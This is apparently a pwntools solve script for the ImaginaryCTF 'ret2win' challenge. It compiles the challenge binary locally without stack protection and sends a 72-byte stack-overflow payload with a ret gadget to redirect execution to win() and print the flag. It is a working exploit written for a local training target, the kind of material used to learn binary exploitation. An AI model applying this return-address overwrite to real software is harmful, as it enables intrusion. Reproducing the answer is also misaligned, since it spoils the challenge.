#!/usr/bin/env python3
"""Solve ImaginaryCTF `ret2win` -- the canonical stack overflow.

Recon: `vuln.c` reads into `char buf[64]` with `gets()` (no bounds check) and
never calls `win()`, which does `system("cat flag.txt")`.

Clue: an unused `win()` plus an unbounded `gets()` is textbook ret2win.
Overflow buf (64) + saved RBP (8) = 72 bytes to reach the saved return
address, then jump to `win`. One bare `ret` gadget first keeps the stack
16-byte aligned so the `system()` call inside `win` doesn't crash
(the README's alignment hint).

Built and run entirely LOCALLY (its own binary, its own flag.txt).

Fetch first:  python challenges/fetch.py ret2win
"""
import os
import subprocess

from pwn import ELF, ROP, context, process

from ctfkit.pwn import flat, p64

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.abspath(os.path.join(HERE, "..", ".."))
CHALL = os.path.join(REPO, "challenges", "ret2win", "challenge")
context.log_level = "error"


def main() -> None:
    binary = os.path.join(CHALL, "vuln")
    # Build locally so we have a known-good, executable binary (the fetched
    # copy may not carry the +x bit).
    subprocess.run(
        ["gcc", "vuln.c", "-o", "vuln", "-fno-stack-protector", "-no-pie"],
        cwd=CHALL, check=True,
    )
    elf = ELF(binary)
    ret = ROP(elf).find_gadget(["ret"])[0]
    payload = flat(b"a" * 72, p64(ret), p64(elf.sym.win))
    proc = process(binary, cwd=CHALL)
    proc.sendline(payload)
    out = proc.recvall(timeout=3).decode(errors="replace")
    for tok in ("ictf{",):
        i = out.find(tok)
        if i != -1:
            print("FLAG:", out[i:out.find("}", i) + 1])
            return
    print("flag not found; output:", out[:120])


if __name__ == "__main__":
    main()
